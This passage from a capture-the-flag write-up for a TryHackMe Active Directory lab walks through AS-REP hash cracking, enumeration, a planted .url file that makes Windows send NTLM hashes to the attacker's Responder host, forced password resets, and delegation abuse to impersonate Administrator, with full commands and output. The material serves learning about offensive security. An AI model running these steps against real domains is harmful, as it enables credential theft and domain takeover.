Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5asrep$23$TABATHA_BRITT@THM.CORP:cba9fb91cc8b10eb748c179445941c85$94723b2c841d885f6f3743344f76de5406438e06bd8fbec8b143c0ee2170c5b5efce9a4ea6654db40b06439244db2216ef5a243afc828a2553053d9a194ba8c32ca58eb0b9705d0f0c114231c9314552a7c173136c1f797563e44a5bdc8c4d99938306d203ce67090e328221563003e72411a00ffc66a74474edf17196ec0ea38a85bbb221747774ef1080388ba3280db0d677edd93ac0e9c75a00a40ab8a47c96bfa6ddf19a7c7fdedfe8092d92622c26603de0794fd00c89035a38a7ca7488adc8c7df0697aa57badae65954439a598ff1455e6a9797532341c01b8f634ecc4749a956:[REDACTED]
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$TABATHA_BRITT@THM.CORP:cba9fb91cc8b10...49a956
Time.Started.....: Sat Jul 19 19:08:55 2025 (2 secs)
Time.Estimated...: Sat Jul 19 19:08:57 2025 (0 secs)
Kernel.Feature...: Optimized Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2461.9 kH/s (0.66ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 5766292/14344385 (40.20%)
Rejected.........: 1172/5766292 (0.02%)
Restore.Point....: 5764244/14344385 (40.18%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: marleyq -> marku1

Started: Sat Jul 19 19:08:46 2025
Stopped: Sat Jul 19 19:08:58 2025
```

username: `TABATHA_BRITT`
password: `[REDACTED]`

Could not crack the other two hashes with the rockyou wordlist, we will come back to them if needed. 
## Exploitation 

I have a suspicion that the mention of Lily Oneill earlier means that we could log in to her account with the password we found, but let's do some password spraying to be thorough.

I tried to use hydra, but was having trouble, so switched to crackmapexec.

![](images/Pasted%20image%2020250710200543.png)

Next I used enum4linux with the known credentials:

```bash
┌──(kali㉿kali)-[~]
└─$ enum4linux -u thm.corp\\lily_oneill -p [REDACTED] -a 10.10.190.63
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Jul 19 17:30:48 2025

 =========================================( Target Information )=========================================
Target ........... 10.10.190.63                                                                                                                                                                                                          
RID Range ........ 500-550,1000-1050
Username ......... 'thm.corp\lily_oneill'
Password ......... '[REDACTED]'
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ============================( Enumerating Workgroup/Domain on 10.10.190.63 )============================

[E] Can't find workgroup/domain                                                                                                                                                                                 
 ================================( Nbtstat Information for 10.10.190.63 )================================

Looking up status of 10.10.190.63                                                                                                                                                                                                           
No reply from 10.10.190.63

 ===================================( Session Check on 10.10.190.63 )===================================

[+] Server 10.10.190.63 allows sessions using username 'thm.corp\lily_oneill', password '[REDACTED]'                                                                                                                                       

 ================================( Getting domain SID for 10.10.190.63 )================================

Bad SMB2 (sign_algo_id=1) signature for message                                                                                                                                                                                             
[0000] 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........
[0000] 0D 54 3A 57 E1 41 7D E2   DC 93 4D 8D 83 66 11 8A   .T:W.A}. ..M..f..
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED

[+] Can't determine if host is part of domain or part of a workgroup                                                                                                                                         information on 10.10.190.63 )===================================

[E] Can't get OS info with smbclient                                                                                                                                                                            
[+] Got OS info for 10.10.190.63 from srvinfo:                                                                                                                                                                                              
Bad SMB2 (sign_algo_id=1) signature for message                                                                                                                                                                                             
[0000] 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........
[0000] 81 F9 66 6F 04 1F A5 FF   54 E6 20 5C 0E C3 54 C7   ..fo.... T. \..T.
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED


 =======================================( Users on 10.10.190.63 )=======================================

[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED                                                                                                                                                                        


[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED                                                                                                                                                                         

 =================================( Share Enumeration on 10.10.190.63 )=================================

do_connect: Connection to 10.10.190.63 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)                                                                                                                                                     

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Data            Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.190.63                                                                                                                
//10.10.190.63/ADMIN$   Mapping: DENIED Listing: N/A Writing: N/A                                                                                                                                                                           
//10.10.190.63/C$       Mapping: DENIED Listing: N/A Writing: N/A
//10.10.190.63/Data     Mapping: OK Listing: OK Writing: N/A

[E] Can't understand response:                                                                          
NT_STATUS_NO_SUCH_FILE listing \*                                                                                                                                                                                                           
//10.10.190.63/IPC$     Mapping: N/A Listing: N/A Writing: N/A
//10.10.190.63/NETLOGON Mapping: OK Listing: DENIED Writing: N/A
//10.10.190.63/SYSVOL   Mapping: OK Listing: DENIED Writing: N/A

 ============================( Password Policy Information for 10.10.190.63 )============================

[E] Unexpected error from polenum:                                                                                                                                                                                                          

[+] Attaching to 10.10.190.63 using thm.corp\lily_oneill:[REDACTED]

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:10.10.190.63)

[+] Trying protocol 445/SMB...

        [!] Protocol failed: SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.



[E] Failed to get password policy with rpcclient                                                                                                                                                                
 =======================================( Groups on 10.10.190.63 )=======================================

[+] Getting builtin groups:                                                                                                                                                                                     
[+]  Getting builtin group memberships:                                                                                                                                                                                                     

[+]  Getting local groups:                                                                                                                                                                                                                  

[+]  Getting local group memberships:                                                                                                                                                                           
[+]  Getting domain groups:                                                                                                                                                                                                                 

[+]  Getting domain group memberships:                                                                                                                                                                          
 ==================( Users on 10.10.190.63 via RID cycling (RIDS: 500-550,1000-1050) )==================

[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.                                                                                                                                                                   

 ===============================( Getting printer info for 10.10.190.63 )===============================

Bad SMB2 (sign_algo_id=1) signature for message                                                                                                                                                                                             
[0000] 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........
[0000] 40 6A AD F1 7C 92 F0 33   A3 31 97 46 55 41 98 05   @j..|..3 .1.FUA..
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Sat Jul 19 17:31:27 2025
```

But it seemed to mostly be a dead end, no user permissions.

And the smb share only has the files we already found.

So we need to try a different path.

Okay so at this point I knew I needed to use Responder since we can upload files to the share (I heard Tyler Ramsbey mention using Responder in [this](https://www.youtube.com/watch?v=rZLQFxPi6LY) walkthrough, highly recommend his videos). But, I had never done this before so I used a guide to understand how.

Thank you [Firat Demir](https://infosecwriteups.com/tryhackme-reset-writeup-446a2bb3f4d8) for the well written explanation.

### SCF File Attack

Essentially this works by uploading a Shell Command File (SCF) containing a command to connect to a malicious server. Windows automatically executes commands in SCF when they are viewed in a directory. So we upload the SCF the SMB share, where the victim machine will attempt to authenticate to our server, where we can capture the NTLM credential hash. 

First we need to create the file.

```bash
┌──(kali㉿kali)-[~]
└─$ nano @open_me.url
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ cat @open_me.url 
[InternetShortcut]
URL=anything
WorkingDirectory=anything
IconFile=\\10.6.61.140\%USERNAME%.icon
IconIndex=1
```

We use @ in the beginning of the file name so it appears at the top of the file list.

Now we upload the file.

I put the file in the onboarding directory of LILY_ONEILL, since the file names were being constantly changed.

```bash
┌──(kali㉿kali)-[~]
└─$ sudo responder -I tun0 -v                   
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.6.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.6.61.140]
    Responder IPv6             [fe80::2e85:fe50:9b9:cd5]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-M0HVMPIAFE2]
    Responder Domain Name      [IYNU.LOCAL]
    Responder DCE-RPC Port     [46678]

[+] Listening for events...                                                                                                                                                                                                                 

[SMB] NTLMv2-SSP Client   : 10.10.190.63
[SMB] NTLMv2-SSP Username : THM\AUTOMATE
[SMB] NTLMv2-SSP Hash     : AUTOMATE::THM:f69b007d455b2c3d:0F0D01C0BC7D4B7462F60B1505A628CC:010100000000000080B86327D9F8DB017F42CF61A167AE280000000002000800490059004E00550001001E00570049004E002D004D003000480056004D0050004900410046004500320004003400570049004E002D004D003000480056004D005000490041004600450032002E00490059004E0055002E004C004F00430041004C0003001400490059004E0055002E004C004F00430041004C0005001400490059004E0055002E004C004F00430041004C000700080080B86327D9F8DB010600040002000000080030003000000000000000010000000020000040AD31CDFA40A06955CD1B1BC4370440710F196C157F3EEF52CBDFBB4FF9B4210A001000000000000000000000000000000000000900200063006900660073002F00310030002E0036002E00360031002E003100340030000000000000000000                                                                     
```

Success!

Now we need to crack the hash.

```bash
┌──(kali㉿kali)-[~]
└─$ hashcat -O -a 0 -m 5600 ntlm_hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-haswell-12th Gen Intel(R) Core(TM) i5-12600K, 2917/5899 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 27

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

AUTOMATE::THM:f69b007d455b2c3d:0f0d01c0bc7d4b7462f60b1505a628cc:010100000000000080b86327d9f8db017f42cf61a167ae280000000002000800490059004e00550001001e00570049004e002d004d003000480056004d0050004900410046004500320004003400570049004e002d004d003000480056004d005000490041004600450032002e00490059004e0055002e004c004f00430041004c0003001400490059004e0055002e004c004f00430041004c0005001400490059004e0055002e004c004f00430041004c000700080080b86327d9f8db010600040002000000080030003000000000000000010000000020000040ad31cdfa40a06955cd1b1bc4370440710f196c157f3eef52cbdfbb4ff9b4210a001000000000000000000000000000000000000900200063006900660073002f00310030002e0036002e00360031002e003100340030000000000000000000:[REDACTED]
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: AUTOMATE::THM:f69b007d455b2c3d:0f0d01c0bc7d4b7462f6...000000
Time.Started.....: Sat Jul 19 18:27:55 2025 (0 secs)
Time.Estimated...: Sat Jul 19 18:27:55 2025 (0 secs)
Kernel.Feature...: Optimized Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1606.0 kH/s (0.73ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 227329/14344385 (1.58%)
Rejected.........: 1/227329 (0.00%)
Restore.Point....: 225281/14344385 (1.57%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: asswipe! -> 920217

Started: Sat Jul 19 18:27:38 2025
Stopped: Sat Jul 19 18:27:56 2025

```

We find that the password is `[REDACTED]`. 

We can use evil-winrm to get a shell with the automate account creds.

```bash
evil-winrm -i haystack.thm.corp -u 'automate' -p '[REDACTED]'
```

And then we find the user.txt flag on the desktop.

### Bloodhound 

```bash
bloodhound-python -c All -u 'TABATHA_BRITT' -p '[REDACTED]' -d thm.corp -ns 10.10.17.210 --zip -c All
```

Install bloodhound

```bash
apt-get install bloodhound
```

Change neo4j password

```bash
sudo nano /etc/bhapi/bhapi.json
```

Launch bloodhound

```bash
bloodhound
```

Default credentials are `admin:admin`, you will be asked to change password upon initial login.

Now we need to upload the bloodhound loot we acquired.

Go to file ingest and upload the bloodhound archive.

![](images/Pasted%20image%2020250731170328.png)

We search for TABATHA_BRITT and mark them as owned.

![](images/Pasted%20image%2020250731170516.png)

We see that TABATHA_BRITT has `GenericAll` perms over SHAWNA_BRAY and RAQUEL_BENSON. It's also worth noting that TABATHA_BRITT has RDP access.

Let's reset SHAWNA_BRAY's password.

```bash
net rpc password "SHAWNA_BRAY" "newP@ssword2022" -U "THM.CORP"/"TABATHA_BRITT"%"[REDACTED]" -S "MACHINE_IP"
```

```bash
└─$ nxc smb THM.CORP -u SHAWNA_BRAY -p 'newP@assword2022' --shares
[*] First time use detected
[*] Creating home directory structure
[*] Creating missing folder logs
[*] Creating missing folder modules
[*] Creating missing folder protocols
[*] Creating missing folder workspaces
[*] Creating missing folder obfuscated_scripts
[*] Creating missing folder screenshots
[*] Creating missing folder logs/sam
[*] Creating missing folder logs/lsa
[*] Creating missing folder logs/ntds
[*] Creating missing folder logs/dpapi
[*] Creating default workspace
[*] Initializing RDP protocol database
[*] Initializing WINRM protocol database
[*] Initializing FTP protocol database
[*] Initializing LDAP protocol database
[*] Initializing SMB protocol database
[*] Initializing VNC protocol database
[*] Initializing MSSQL protocol database
[*] Initializing NFS protocol database
[*] Initializing WMI protocol database
[*] Initializing SSH protocol database
[*] Copying default configuration file
                                              
```

We have now verified that SHAWNA_BRAY is compromised.

Now by digging through bloodhound we can also see that SHAWNA_BRAY has `ForceChangePassword` perms over CRUZ_HALL.

![](images/Pasted%20image%2020250731181940.png)

We can then see that CRUZ_HALL has `ForceChangePassword` perms over DARLA_WINTERS. 

![](images/Pasted%20image%2020250731182007.png)

DARLA_WINTERS has `AllowedToDelegate` execution privileges over HAYSTACK.THM.CORP.

So we need to compromise CRUZ_HALL ---> compromise DARLA_WINTERS.

```bash
net rpc password "CRUZ_HALL" "newP@ssword2022" -U "THM.CORP"/"SHAWNA_BRAY"%"newP@ssword2022" -S "MACHINE_IP"
```

```bash
net rpc password "DARLA_WINTERS" "newP@ssword2022" -U "THM.CORP"/"CRUZ_HALL"%"newP@ssword2022" -S "10.201.25.58"

```

We can now use getST.py to impersonate the Administrator for the CIFS service on the Domain Controller.

```bash
getST.py -spn "cifs/haystack.thm.corp" -impersonate "Administrator" "thm.corp/DARLA_WINTERS:newP@ssword2022"
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_haystack.thm.corp@THM.CORP.ccache
```

We now set the ccache using the KRB5CCNAME enviroment variable.

```bash
export KRB5CCNAME=Administrator@cifs_haystack.thm.corp@THM.CORP.ccache 
```

Now we use wmiexec.py with the Kerberos authentication to get a shell as Administrator.

```bash
wmiexec.py -k -no-pass Administrator@haystack.thm.corp
```

And now we can get the root flag at `C:\Users\Administrator\Desktop\root.txt`

## Conclusion

This was a really hard box for me. Learning how to exploit Active Directory has been pretty different from what I'm used to, and I had to use a lot of outside resources to figure everything out. I learned a lot about enumerating AD, gaining initial access through responder NTLM hash gathering, using bloodhound to find privilege escalation pathways, and using a plethora of new tools to navigate the AD enviroment. I would like to give a huge shoutout to jaxafed, and highly recommend reading his [walkthrough](https://jaxafed.github.io/posts/tryhackme-reset/) for a more comprehensive and concise guide. I also would recommend watching [Tyler Ramsbey's](https://www.youtube.com/@TylerRamsbey) AD hacking videos as they provide a general overview of how to pentest AD environments. I still have a lot to learn, and AD is clearly a weak point of mine. I hope that my next AD write-up will have a more logical playbook, as well as better formatting. 